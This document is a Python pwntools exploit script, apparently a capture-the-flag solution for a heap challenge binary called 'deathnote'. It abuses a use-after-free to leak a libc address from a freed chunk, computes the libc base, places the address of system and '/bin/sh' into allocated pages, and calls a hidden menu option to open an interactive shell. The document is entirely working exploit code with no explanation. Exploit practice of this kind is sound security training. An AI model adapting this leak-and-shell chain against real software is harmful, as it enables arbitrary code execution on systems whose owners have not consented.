#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./deathnote")
libc = ELF("glibc/libc.so.6")
gs = """
"""

def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:
        p = remote("")
    return p

p = start()

def add(size: int, idx: int, name: bytes):
    p.sendlineafter("💀 ".encode(), b"1")
    p.recvuntil(b"How big is your request?")
    p.sendlineafter("💀 ".encode(), str(size).encode())
    p.recvuntil(b"Page?")
    p.sendlineafter("💀 ".encode(), str(idx).encode())
    p.recvuntil(b"Name of victim:")
    p.sendlineafter("💀 ".encode(), name)

def delete(idx: int):
    p.sendlineafter("💀 ".encode(), b"2")
    p.recvuntil(b"Page?")
    p.sendlineafter("💀 ".encode(), str(idx).encode())

def show(idx: int):
    p.sendlineafter("💀 ".encode(), b"3")
    p.recvuntil(b"Page?")
    p.sendlineafter("💀 ".encode(), str(idx).encode()
                    )

for i in range(1, 10):
    add(0x80, i, str(i).encode()*0x20)

for i in range(1, 10):
    delete(10-i)

show(1)
p.recvuntil(b"Page content: ")

libc.address = u64(p.recv(6)+b'\0'*2) - 0x21ace0
log.success(hex(libc.address))

add(0x80, 0, hex(libc.sym.system)[2:].encode()+b'\0')
add(0x80, 1, b"/bin/sh\0")

p.sendlineafter("💀 ".encode(), b"42")

p.interactive()
